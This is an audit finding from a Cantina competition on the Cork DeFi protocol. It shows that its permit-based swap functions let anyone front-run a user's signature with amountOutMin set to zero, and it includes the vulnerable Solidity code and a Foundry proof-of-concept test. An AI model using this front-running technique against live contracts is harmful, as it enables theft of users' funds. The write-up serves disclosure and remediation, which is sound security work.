---
tags:
  - lang/solidity
  - sector/dex
  - platform/cantina
  - has/poc
  - severity/high
  - impact/mev/frontrun
protocol: "[[Cork]]"
auditors:
  - "[[0xDjango]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf"
genome:
  - "[[spot-price]]"
  - "[[frontrun]]"
  - "[[frontrun-exposure]]"
  - "[[timestamp-dependence]]"
---
# Attacker can perform MEV by providing amountOutMin = 0 for all ERC-2612 swaps 

- id: 53124
- impact: HIGH
- protocol: [[Cork]]
- reporter: 0xDjango (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_cork_december2024.pdf

## Summary


This bug report highlights an issue with the FlashSwapRouter.sol code, where users can swap RA for DS without requiring a separate approval transaction. This can be exploited by an attacker who can provide a valid signature from another user and set the amountOutMin parameter to 0, causing losses for the original user. The report provides a proof of concept and recommends not allowing the amountOutMin parameter when the swap is initiated by any party on behalf of a user with a permit signature. The bug has been fixed in PR 280.

## Details

## Context
(No context files were provided by the reviewer)

## Description
Similar to finding #6, `FlashSwapRouter.sol` allows users to swap RA for DS without requiring a separate approval transaction. The functions `swapRaForDS()` and `swapDsForRa()` take a `rawRaPermitSig` parameter that is passed to the token's `permit()` function.

However, any user can call these functions with a valid signature from another user, perhaps by front-running a transaction from another user. The attacker can provide an `amountOutMin` param of 0, causing losses for the original user by MEV.

## Function: swapDsforRa
```solidity
function swapDsforRa(
    Id reserveId,
    uint256 dsId,
    uint256 amount,
    uint256 amountOutMin,
    address user,
    bytes memory rawDsPermitSig,
    uint256 deadline
) external returns (uint256 amountOut) {
    if (rawDsPermitSig.length == 0 || deadline == 0) {
        revert InvalidSignature();
    }
    ReserveState storage self = reserves[reserveId];
    AssetPair storage assetPair = self.ds[dsId];
    DepegSwapLibrary.permit(
        address(assetPair.ds), rawDsPermitSig, user, address(this), amount, deadline, "swapDsforRa"
    );
    assetPair.ds.transferFrom(user, address(this), amount);
    bool success;
    uint256 repaymentAmount;
    (amountOut, repaymentAmount, success) = __swapDsforRa(assetPair, reserveId, dsId, amount, amountOutMin, user);
    if (!success) {
        revert IMathError.InsufficientLiquidity();
    }
    self.recalculateHIYA(dsId, amountOut, amount);
    emit DsSwapped(reserveId, dsId, user, amount, amountOut);
}
```

As seen above, the function takes a `rawDsPermitSig` which is passed to the respective token's `permit` function (either RA or DS token). Once passed, the funds are taken from the user that provided the signature.

> **Note:** This is the same for both `swapRaForDS()` and `swapDsForRa()`. Anyone can call this function with a valid signature and provide an `amountOutMin` value of 0. This will open up the user to theft of funds through MEV.

## Internal Function: __swapDsforRa
```solidity
function __swapDsforRa(
    AssetPair storage assetPair,
    Id reserveId,
    uint256 dsId,
    uint256 amount,
    uint256 amountOutMin,
    address caller
) internal returns (uint256 amountOut, uint256 repaymentAmount, bool success) {
    (amountOut, repaymentAmount, success) = assetPair.getAmountOutSellDS(amount, hook);
    if (!success) {
        return (amountOut, repaymentAmount, success);
    }
    if (amountOut < amountOutMin) {
        revert InsufficientOutputAmount();
    }
    __flashSwap(assetPair, 0, amount, dsId, reserveId, false, amountOut, caller, amount);
}
```

## Proof of Concept
The following proof of concept illustrates how any user can initiate a swap for a user that has provided a signature, and can provide an `amountOutMin = 0` in the function parameters.

```solidity
pragma solidity ^0.8.24;
import "./../../contracts/core/flash-swaps/FlashSwapRouter.sol";
import {Helper} from "./Helper.sol";
import {DummyWETH} from "./../../contracts/dummy/DummyWETH.sol";
import "./../../contracts/core/assets/Asset.sol";
import {Id, Pair, PairLibrary} from "./../../contracts/libraries/Pair.sol";
import "./../../contracts/interfaces/IPSMcore.sol";
import "./../../contracts/interfaces/IDsFlashSwapRouter.sol";
import "forge-std/console.sol";

contract FlashSwapTest is Helper {
    DummyWETH internal ra; // Use DummyERCWithMetadata instead of DummyWETH for permit
    DummyWETH internal pa;
    Id public currencyId;
    uint256 public DEFAULT_DEPOSIT_AMOUNT = 2050 ether;
    uint256 public dsId;
    address public ct;
    DummyWETH public ds;
    uint256 immutable deadline = block.timestamp + 1 hours;

    // Generate private key first
    uint256 user1Key = vm.deriveKey(
        "test test test test test test test test test test test junk",
    );

    // Create address from the private key
    address user1 = vm.addr(user1Key);
    address user2 = makeAddr("user2");
    uint256 precision = 10 ** 18;

    function defaultInitialArp() internal pure virtual override returns (uint256) {
        return 5 ether;
    }

    function setUp() public virtual {
        vm.startPrank(DEFAULT_ADDRESS);
        deployModuleCore();
        (ra, pa, currencyId) = initializeAndIssueNewDs(block.timestamp + 1 days);
        vm.deal(DEFAULT_ADDRESS, 100_000_000_000 ether);
        ra.deposit{value: 1_000_000_000 ether}();
        pa.deposit{value: 1_000_000_000 ether}();
        ra.approve(address(moduleCore), 100_000_000_000 ether);
        moduleCore.depositPsm(currencyId, DEFAULT_DEPOSIT_AMOUNT);
        moduleCore.depositLv(currencyId, DEFAULT_DEPOSIT_AMOUNT, 0, 0);
        // save initial data
        fetchProtocolGeneralInfo();
    }

    function fetchProtocolGeneralInfo() internal {
        dsId = moduleCore.lastDsId(currencyId);
        address ct_;
        address ds_;
        (ct_, ds_) = moduleCore.swapAsset(currencyId, dsId);
        ct = ct_;
        ds = DummyWETH(payable(ds_));
    }

    function test_MEV() public virtual {
        // Add more liquidity to the router and AMM
        moduleCore.depositLv(currencyId, 10_000 ether, 0, 0);
        // Give user1 some RA tokens to test with
        vm.deal(user1, 10 ether);
        vm.startPrank(user1);
        ra.deposit{value: 10 ether}();
        vm.stopPrank();
        // Craft permit signature for user1
        uint256 nonce = ra.nonces(user1);
        bytes32 PERMIT_TYPEHASH = keccak256(
            "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
        );
        bytes32 domainSeparator = ra.DOMAIN_SEPARATOR();
        bytes32 structHash = keccak256(
            abi.encode(
                PERMIT_TYPEHASH,
                user1,
                address(flashSwapRouter),
                10 ether,
                nonce,
                deadline
            )
        );
        bytes32 digest = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, structHash)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(user1Key, digest);
        bytes memory rawRaPermitSig = abi.encodePacked(r, s, v);
        // Execute the swap
        vm.prank(user2);
        uint256 amountOut = flashSwapRouter.swapRaforDs(
            currencyId,
            dsId,
            10 ether,
            0,
            user1,
            rawRaPermitSig,
            deadline,
            defaultBuyApproxParams()
        );
    }
}
```

## Recommendation
Do not allow `amountOutMin` parameters when the swap can be initiated by any party on behalf of a user that has provided a permit signature.

## Cork
Fixed in PR 280.
